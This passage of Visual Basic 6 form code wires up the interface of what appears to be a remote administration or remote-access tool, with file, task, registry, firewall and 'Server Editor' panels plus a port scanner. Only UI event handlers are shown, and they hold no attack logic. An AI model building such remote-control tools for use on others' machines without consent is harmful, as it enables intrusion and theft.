                   Password = Inputs(Index)
            Case 2 '
                   
     End Select
End Sub
Private Sub Checks_Click(Index As Integer)
    'Redirect Configurations CheckBoxs to the XConfigurations Module
     Call XConfiguration.Configure(Index, Checks(Index).Value)
End Sub
Private Sub ConnectionsList_DblClick()
    If ConnectionsList.ListItems.Count > 0 Then M_FireWall.GiveDetailsAbtConnection
End Sub
Private Sub Control_Box_Click(Index As Integer)
   'Redirect The Control Boxes Click to connection module
    Call ConnectionManagerButtons(Index)
End Sub
Private Sub Current_Connected_DblClick()
   'Redirect The DblClick Event to connection module
    Call CurrentConnectedDblClick
End Sub
''''''''''''''''''''''''''''''''''' << Main Window >>'''''''''''''''''''''''''''''''''
Private Sub door_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
        'Show the effect of door clicked (sellected)
        door(Index).BorderStyle = 1
        door_nocked = True
End Sub
Private Sub door_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
        'Hide the effect of door clicked (sellected)
        door(Index).BorderStyle = 0
        door_nocked = False
End Sub
Private Sub Files_Explore_DblClick()
    If Files_Explore.ListItems.Count > 0 Then GiveDetailsAbtFBitems 'Execute Files
End Sub
Private Sub Control_Box_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Control_Box(Index).ForeColor = vbBlack
    Control_Box(Index).BackColor = vbWhite
End Sub
Private Sub Control_Box_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Control_Box(Index).ForeColor = vbWhite
    Control_Box(Index).BackColor = vbBlack
End Sub
Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
'Operate the drag and drop of the main form
  MousePointer = 5
  b = X
  C = Y
  a = True
End Sub
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Operate the drag and drop of the main form
    If a Then
        Move Left + (X - b), Top + (Y - C)
    End If
End Sub
Private Sub Form_Click()
  'Operate the drag and drop of the main form
   a = False
   MousePointer = 0
End Sub
Private Sub TiTle_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
'Operate the drag and drop of the main form
  TiTle.MousePointer = 5
  b = X
  C = Y
  a = True
End Sub
Private Sub TiTle_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Operate the drag and drop of the main form
    If a Then
        Me.Move Left + (X - b), Top + (Y - C)
    End If
End Sub
Private Sub TiTle_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
  'Operate the drag and drop of the main form
   a = False
   TiTle.MousePointer = 0
End Sub
'''''''''''''''''''''''''''''''''' << File Manager >> ''''''''''''''''''''''''''''''''
Public Sub File_Browser_Buttons_Click(Index As Integer)
   'Redirect The Event To The Function There In The FileManager Module
    FileBrowserButtons (Index)
End Sub
Private Sub File_Browser_Buttons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    File_Browser_Buttons(Index).BorderStyle = 1
End Sub
Private Sub File_Browser_Buttons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    File_Browser_Buttons(Index).BorderStyle = 0
End Sub
Private Sub Dirs_Explore_DblClick()
   'Redirect The DClick To The Code Lies In The FileManager Module
    DirsExploreDblClick
End Sub
Private Sub Dirs_Explore_Click()
   'Redirect The Click To The Code Lies In The FileManager Module
    DirsExplorelClick
End Sub
'''''''''''''''''''''''''''''''''' << Tools >> ''''''''''''''''''''''''''''''''
Function Load_tools()
On Error Resume Next
    'Code Here
End Function
Private Sub Tools_Buttons_Click(Index As Integer)
  On Error Resume Next
  Select Case Index
         Case 0 'Download Manager
            DownloadManager.Show
         Case 1 'Upload Manager
            FileBrowser.Upload_File
         Case 2 'X-Editor
            Editor.Show
         Case 3 'X-Router
            Router.Show
         Case 4 'X-Whois
            Whois.Show
         Case 5 'X-ping
            Ping.Show
         Case 6 'Port Scanner
            Scanner.Show
  End Select
End Sub
Private Sub Tools_Buttons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Tools_Buttons(Index).BorderStyle = 1
End Sub
Private Sub Tools_Buttons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Tools_Buttons(Index).BorderStyle = 0
End Sub
'''''''''''''''''''''''''''''''' << Task Manager >>'''''''''''''''''''''''''''''''''''
Private Sub Task_Manager_Buttons_Click(Index As Integer)
    'Redirect The Event To The Function There In The TaskManager Module
     TaskManagerButtons (Index)
End Sub
Private Sub Task_Manager_Buttons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Task_Manager_Buttons(Index).BorderStyle = 1
End Sub
Private Sub Task_Manager_Buttons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Task_Manager_Buttons(Index).BorderStyle = 0
End Sub
Private Sub TaskView_DblClick()
    If TaskView.ListItems.Count > 0 Then GiveDetailsAbtTMTask
End Sub
Private Sub ProcView_DblClick()
    If ProcView.ListItems.Count > 0 Then GiveDetailsAbtTMProc
End Sub
'''''''''''''''''''''''''''''''''' << IP Manager >> ''''''''''''''''''''''''''''''''
Private Sub AddressBook_DblClick()
     On Error Resume Next
    'Insert The Item Into The Input Text Boxs
     If AddressBook.ListItems.Count Then
        txt_IP = AddressBook.SelectedItem.Text
        txt_Port = AddressBook.SelectedItem.SubItems(1)
     End If
End Sub
Private Sub AddressBook_Click()
     On Error Resume Next
    'Insert The Item Into The Input Text Boxs
     If AddressBook.ListItems.Count Then
        AddressBook.ToolTipText = "Comment : " & AddressBook.SelectedItem.SubItems(2)
     End If
End Sub
Private Sub IP_Buttons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    IP_Buttons(Index).BorderStyle = 1
End Sub
Private Sub IP_Buttons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    IP_Buttons(Index).BorderStyle = 0
End Sub
'''''''''''''''''''''''''''''''''''' << System Manager >>''''''''''''''''''''''''''''''
Private Sub SystemButtons_Click(Index As Integer)
    'Redirect The Event To The Function There In The TaskManager Module
     SystemControlButtons (Index)
End Sub
Private Sub SystemButtons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    SystemButtons(Index).ForeColor = vbBlack
    SystemButtons(Index).BackColor = vbWhite
End Sub
Private Sub SystemButtons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    SystemButtons(Index).ForeColor = vbWhite
    SystemButtons(Index).BackColor = vbBlack
End Sub
'''''''''''''''''''''''''''''''''''' << Chat Manager >> '''''''''''''''''''''''''''''''
Private Sub ChatCat_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    On Error Resume Next
    Dim i As Integer 'General Counter
    For i = 0 To ChatCat.UBound
        ChatCat(i).FontSize = 8
        ChatCat(i).BackColor = &HC0C0C0
        ChatRoom(i).Visible = False
    Next i
    ChatCat(Index).BackColor = &H808080
    ChatCat(Index).FontSize = 9
    ChatRoom(Index).Visible = True
End Sub
Private Sub ChatButtons_Click(Index As Integer)
    ChatManagerButtons (Index)
End Sub
Private Sub ChatButtons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    ChatButtons(Index).BackColor = &HC0C0C0
End Sub
Private Sub ChatButtons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    ChatButtons(Index).BackColor = &HE0E0E0
End Sub
Private Sub txt_msg_KeyPress(Index As Integer, KeyAscii As Integer)
    If Index = 3 Then
        If KeyAscii = 13 Then 'Enter Pressed
            If Len(txt_msg(3)) Then
                ComposeTextChatData txt_msg(3)
                txt_msg(3) = "" 'Clear The Text Buffer
            End If
        End If
    End If
End Sub
Private Sub WhiteBoardButtons_Click(Index As Integer)
    WhiteBoardButtonsClick (Index)
End Sub
Private Sub WhiteBoardButtons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dim i As Integer
    If Index <> 0 And Index < 4 Then
        For i = 0 To WhiteBoardButtons.UBound
            WhiteBoardButtons(i).BorderStyle = 0
        Next i
    End If
    WhiteBoardButtons(Index).BorderStyle = 1
End Sub
Private Sub WhiteBoardButtons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Index = 0 Or Index > 3 Then
        WhiteBoardButtons(Index).BorderStyle = 0
    End If
End Sub
Private Sub WBSelectColor_Click()
    On Error Resume Next
    FileBrowser.CMD1.DialogTitle = "Select The Drowing(Fore Ground)Color"
    FileBrowser.CMD1.ShowColor
    WBSelectColor.BackColor = FileBrowser.CMD1.Color
    WhiteBoardButtonsClick (6)
End Sub
Private Sub WBScreen_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 1 Then WhiteBoardSRDown Int(X), Int(Y)
End Sub
Private Sub WBScreen_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 1 Then WhiteBoardSRUP Int(X), Int(Y)
End Sub
Private Sub WBScreen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = 1 Then WhiteBoardSRMove Int(X), Int(Y)
End Sub
Private Sub MSscreen_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Redirect To ChatManager
     If Button = 1 Then
        MyRound = True
        MsScreenDown Int(X), Int(Y)
     End If
End Sub
Private Sub MSscreen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    'Redirect To ChatManager
     MsScreenMove Int(X), Int(Y)
End Sub
'''''''''''''''''''''''''''''''''''' << Registry Manager >> '''''''''''''''''''''''''''''''
Private Sub Reg_Manager_Buttons_Click(Index As Integer)
    RegistryManagerButtons (Index)
End Sub
Private Sub Reg_Manager_Buttons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Reg_Manager_Buttons(Index).BorderStyle = 1
End Sub
Private Sub Reg_Manager_Buttons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    Reg_Manager_Buttons(Index).BorderStyle = 0
End Sub
Private Sub RegListView_DblClick()
    If RegListView.ListItems.Count > 0 Then GiveDetailsAbtRMvalue
End Sub
''''''''''''''''''''''''''''''''''''' << Server Editor >> ''''''''''''''''''''''''''''''''''
Private Sub EditServerButtons_Click(Index As Integer)
    'Redirect Event And Code to The EditServer Module
     ServerEditorButtons (Index)
End Sub
Private Sub EditServerButtons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    EditServerButtons(Index).BackColor = &HC0C0C0
End Sub
Private Sub EditServerButtons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    EditServerButtons(Index).BackColor = &HE0E0E0
End Sub
Private Sub RegKeysTree_DblClick()
   'Redirect The DClick To The Code Lies In The FileManager Module
    RegTreeViewDblClick
End Sub
Private Sub RegKeysTree_Click()
   'Redirect The Click To The Code Lies In The FileManager Module
    RegTreeViewClick
End Sub
''''''''''''''''''''''''''''''''''''' << Fire Wall >> ''''''''''''''''''''''''''''''''''
Private Sub FireWallButtons_Click(Index As Integer)
    'Redirect Event And Code to The EditServer Module
     FireWallButtonsCL (Index)
End Sub
Private Sub FireWallButtons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    FireWallButtons(Index).BackColor = &HC0C0C0
End Sub
Private Sub FireWallButtons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    FireWallButtons(Index).BackColor = &HE0E0E0
End Sub
'''''''''''''''''''''''''''''''''''' << HardWare Manager >> '''''''''''''''''''''''''''''
Private Sub HardwareButtons_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    HardwareButtons(Index).ForeColor = vbBlack
    HardwareButtons(Index).BackColor = vbWhite
End Sub
Private Sub HardwareButtons_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
    HardwareButtons(Index).ForeColor = vbWhite
    HardwareButtons(Index).BackColor = vbBlack
End Sub
Private Sub HardwareButtons_Click(Index As Integer)
    'Redirect Event And Code to The EditServer Module
     DeviceManagerButtons (Index)
End Sub
